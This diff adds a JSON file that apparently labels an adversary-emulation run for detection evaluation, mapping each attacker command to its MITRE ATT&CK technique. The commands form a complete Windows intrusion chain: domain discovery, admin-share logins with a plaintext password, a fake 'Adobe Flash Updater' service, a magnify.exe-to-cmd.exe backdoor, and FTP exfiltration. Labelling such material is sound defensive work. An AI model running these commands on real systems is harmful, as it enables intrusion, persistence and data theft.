@@ -1,0 +1,334 @@
+{
+  "commands": [
+    {
+      "command": "route print",
+      "step": "12.A.1",
+      "technique_id": "T1016",
+      "technique_name": "System Network Configuration Discovery",
+      "tactic": "Discovery",
+      "source_username": "nmartha"
+    },
+    {
+      "command": "ipconfig /all",
+      "step": "12.A.2",
+      "technique_id": "T1016",
+      "technique_name": "System Network Configuration Discovery",
+      "tactic": "Discovery",
+      "source_username": "nmartha"
+    },
+    {
+      "command": "whoami /all /fo list",
+      "step": "12.B.1",
+      "technique_id": "T1033",
+      "technique_name": "System Owner/User Discovery",
+      "tactic": "Discovery",
+      "source_username": "nmartha"
+    },
+    {
+      "command": "qprocess *",
+      "step": "12.C.1",
+      "technique_id": "T1057",
+      "technique_name": "Process Discovery",
+      "tactic": "Discovery",
+      "source_username": "nmartha"
+    },
+    {
+      "command": "net start",
+      "step": "12.D.1",
+      "technique_id": "T1007",
+      "technique_name": "System Service Discovery",
+      "tactic": "Discovery",
+      "source_username": "nmartha"
+    },
+    {
+      "command": "net group \"Domain Admins\" /domain",
+      "step": "12.F.1",
+      "technique_id": "T1069",
+      "technique_name": "Permission Groups Discovery",
+      "tactic": "Discovery",
+      "source_username": "nmartha"
+    },
+    {
+      "command": "net localgroup \"Administrators\"",
+      "step": "12.F.2",
+      "technique_id": "T1069",
+      "technique_name": "Permission Groups Discovery",
+      "tactic": "Discovery",
+      "source_username": "nmartha"
+    },
+    {
+      "command": "net user",
+      "step": "12.G.1",
+      "technique_id": "T1087",
+      "technique_name": "Account Discovery",
+      "tactic": "Discovery",
+      "source_username": "nmartha"
+    },
+    {
+      "command": "net user /domain",
+      "step": "12.G.2",
+      "technique_id": "T1087",
+      "technique_name": "Account Discovery",
+      "tactic": "Discovery",
+      "source_username": "nmartha"
+    },
+    {
+      "command": "net group \"Domain Computers\" /domain",
+      "step": "13.A.1",
+      "technique_id": "T1018",
+      "technique_name": "Remote System Discovery",
+      "tactic": "Discovery",
+      "source_username": "nmartha"
+    },
+    {
+      "command": "net use",
+      "step": "13.B.1",
+      "technique_id": "T1049",
+      "technique_name": "System Network Connections Discovery",
+      "tactic": "Discovery",
+      "source_username": "nmartha"
+    },
+    {
+      "command": "netstat -ano",
+      "step": "13.B.2",
+      "technique_id": "T1049",
+      "technique_name": "System Network Connections Discovery",
+      "tactic": "Discovery",
+      "source_username": "nmartha"
+    },
+    {
+      "command": "reg query HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLUA",
+      "step": "13.C.1",
+      "technique_id": "T1012",
+      "technique_name": "Query Registry",
+      "tactic": "Discovery",
+      "source_username": "nmartha"
+    },
+    {
+      "command": "net use `\\`\\HFDC01\\ADMIN$ /user:shire\\pgustavo W1n1!19",
+      "step": "16.B.1",
+      "technique_id": "T1078",
+      "technique_name": "Valid Accounts",
+      "tactic": "Lateral Movement",
+      "source_username": "nmartha*"
+    },
+    {
+      "command": "net use `\\`\\HFDC01\\ADMIN$ /user:shire\\pgustavo W1n1!19",
+      "step": "16.B.1",
+      "technique_id": "T1077",
+      "technique_name": "Windows Admin Shares",
+      "tactic": "Lateral Movement",
+      "source_username": "nmartha*"
+    },
+    {
+      "command": "net use /delete `\\`\\HFDC01\\ADMIN$",
+      "step": "16.C.1",
+      "technique_id": "T1126",
+      "technique_name": "Network Share Connection Removal",
+      "tactic": "Defense Evasion",
+      "source_username": "nmartha*"
+    },
+    {
+      "command": "net use `\\`\\HFDC01\\C$ password /user:shire\\pgustavo",
+      "step": "16.D.1",
+      "technique_id": "T1078",
+      "technique_name": "Valid Accounts",
+      "tactic": "Lateral Movement",
+      "source_username": "nmartha*"
+    },
+    {
+      "command": "net use `\\`\\HFDC01\\C$ password /user:shire\\pgustavo",
+      "step": "16.D.1",
+      "technique_id": "T1077",
+      "technique_name": "Windows Admin Shares",
+      "tactic": "Lateral Movement",
+      "source_username": "nmartha*"
+    },
+    {
+      "command": "move-item c:\\windows\\autoupdate.vbs \"\\\\HFDC01\\C$\\Users\\pgustavo\\AppData\\Roaming\\Adobe\\Flash Player\\autoupdate.vbs\"",
+      "step": "16.G.1",
+      "technique_id": "T1105",
+      "technique_name": "Remote File Copy",
+      "tactic": "Command and Control Lateral Movement",
+      "source_username": "pgustavo"
+    },
+    {
+      "command": "c:\\windows\\system32\\sc.exe \\\\HFDC01 query",
+      "step": "16.H.1",
+      "technique_id": "T1007",
+      "technique_name": "System Service Discovery",
+      "tactic": "Discovery",
+      "source_username": "pgustavo"
+    },
+    {
+      "command": "C:\\WINDOWS\\system32\\sc.exe `\\`\\HFDC01 create AdobeUpdater binPath= \"cmd.exe /c `\\`\"C:\\Users\\pgustavo\\AppData\\Roaming\\Adobe\\Flash Player\\autoupdate.vbs`\\`\" \" DisplayName= \"Adobe Flash Updater\" start= auto",
+      "step": "16.I.1",
+      "technique_id": "T1050",
+      "technique_name": "New Service",
+      "tactic": "Privilege Escalation\nPersistence",
+      "source_username": "pgustavo"
+    },
+    {
+      "command": "c:\\windows\\system32\\sc.exe `\\`\\HFDC01 qc AdobeUpdater",
+      "step": "16.J.1",
+      "technique_id": "T1007",
+      "technique_name": "System Service Discovery",
+      "tactic": "Discovery",
+      "source_username": "pgustavo"
+    },
+    {
+      "command": "type \"c:\\users\\usrname\\AppData\\Roaming\\Adobe\\Flash Player\\autoupdate.vbs\"",
+      "step": "16.K.1",
+      "technique_id": "T1083",
+      "technique_name": "File and Directory Discovery",
+      "tactic": "Discovery",
+      "source_username": "pgustavo"
+    },
+    {
+      "command": "c:\\windows\\system32\\sc.exe `\\`\\HFDC01 start AdobeUpdater",
+      "step": "16.L.1",
+      "technique_id": "T1035",
+      "technique_name": "Service Execution",
+      "tactic": "Execution",
+      "source_username": "pgustavo"
+    },
+    {
+      "command": "reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"",
+      "step": "17.A.1",
+      "technique_id": "T1007",
+      "technique_name": "System Service Discovery",
+      "tactic": "Discovery",
+      "source_username": "SYSTEM"
+    },
+    {
+      "command": "takeown.exe /F C:\\Windows\\system32\\magnify.exe",
+      "step": "17.B.1",
+      "technique_id": "T1222",
+      "technique_name": "File Permissions Modification",
+      "tactic": "Defense Evasion",
+      "source_username": "SYSTEM"
+    },
+    {
+      "command": "c:\\windows\\system32\\icacls.exe C:\\windows\\system32\\magnify.exe /grant SYSTEM:F",
+      "step": "17.B.2",
+      "technique_id": "T1222",
+      "technique_name": "File Permissions Modification",
+      "tactic": "Defense Evasion",
+      "source_username": "SYSTEM"
+    },
+    {
+      "command": "copy C:\\Windows\\system32\\cmd.exe C:\\windows\\system32\\magnify.exe",
+      "step": "17.C.1",
+      "technique_id": "T1015",
+      "technique_name": "Accessibility Features",
+      "tactic": "Persistence\nPrivilege Escalation",
+      "source_username": "SYSTEM"
+    },
+    {
+      "command": "get-childitem -Path \\\\HFDC01\\IT\\",
+      "step": "18.A.1",
+      "technique_id": "T1083",
+      "technique_name": "File and Directory Discovery",
+      "tactic": "Discovery",
+      "source_username": "nmartha*"
+    },
+    {
+      "command": "Copy-Item \\\\HFDC01\\IT\\recipe.txt C:\\\"$\"Recycle.Bin\\recipe.txt",
+      "step": "18.B.1",
+      "technique_id": "T1074",
+      "technique_name": "Data Staged",
+      "tactic": "Collection",
+      "source_username": "nmartha*"
+    },
+    {
+      "command": "recycler.exe a -t7z C:\\\"$\"Recycle.Bin\\old.7z C:\\\"$\"Recycle.Bin\\recipe.txt",
+      "step": "19.B.1",
+      "technique_id": "T1002",
+      "technique_name": "Data Compressed",
+      "tactic": "Exfiltration",
+      "source_username": "nmartha*"
+    },
+    {
+      "command": "c:\\windows\\system32\\ftp.exe -v -s:ftp.txt",
+      "step": "19.C.1",
+      "technique_id": "T1048",
+      "technique_name": "Exfiltration Over Alternative Protocol",
+      "tactic": "Exfiltration",
+      "source_username": "nmartha*"
+    }
+  ],
+  "artifacts": [
+    {
+      "artifact": "autoupdate.vbs",
+      "step": "11.A.1",
+      "technique_id": "T1064",
+      "technique_name": "Scripting",
+      "tactic": "Defense Evasion\nExecution",
+      "source_username": "nmartha"
+    },
+    {
+      "artifact": "update.ps1",
+      "step": "14.A.1",
+      "technique_id": "T1088",
+      "technique_name": "Bypass User Account Control",
+      "tactic": "Privilege Escalation",
+      "source_username": "nmartha"
+    },
+    {
+      "artifact": "update.ps1",
+      "step": "14.A.1",
+      "technique_id": "T1105",
+      "technique_name": "Remote File Copy",
+      "tactic": "Command And Control\nLateral Movement",
+      "source_username": "nmartha"
+    },
+    {
+      "artifact": "update.ps1",
+      "step": "14.A.1",
+      "technique_id": "T1071",
+      "technique_name": "Standard Application Layer Protocol",
+      "tactic": "Command And Control",
+      "source_username": "nmartha"
+    },
+    {
+      "artifact": "update.ps1",
+      "step": "14.A.1",
+      "technique_id": "T1043",
+      "technique_name": "Commonly Used Port",
+      "tactic": "Command And Control",
+      "source_username": "nmartha"
+    },
+    {
+      "artifact": "update.ps1",
+      "step": "14.A.1",
+      "technique_id": "T1134",
+      "technique_name": "Access Token Manipulation",
+      "tactic": "Privilege Escalation\nDefense Evasion",
+      "source_username": "nmartha"
+    },
+    {
+      "artifact": "autoupdate.vbs",
+      "step": "16.E.1",
+      "technique_id": "T1105",
+      "technique_name": "Remote File Copy",
+      "tactic": "Command and Control Lateral Movement",
+      "source_username": "nmartha*"
+    },
+    {
+      "artifact": "recycler.exe",
+      "step": "19.A.",
+      "technique_id": "T1105",
+      "technique_name": "Remote File Copy",
+      "tactic": "Defense Evasion",
+      "source_username": "nmartha*"
+    },
+    {
+      "artifact": "ftp.txt",
+      "step": "19.C.1",
+      "technique_id": "T1048",
+      "technique_name": "Exfiltration Over Alternative Protocol",
+      "tactic": "Exfiltration",
+      "source_username": "nmartha*"
+    }
+  ]
+}
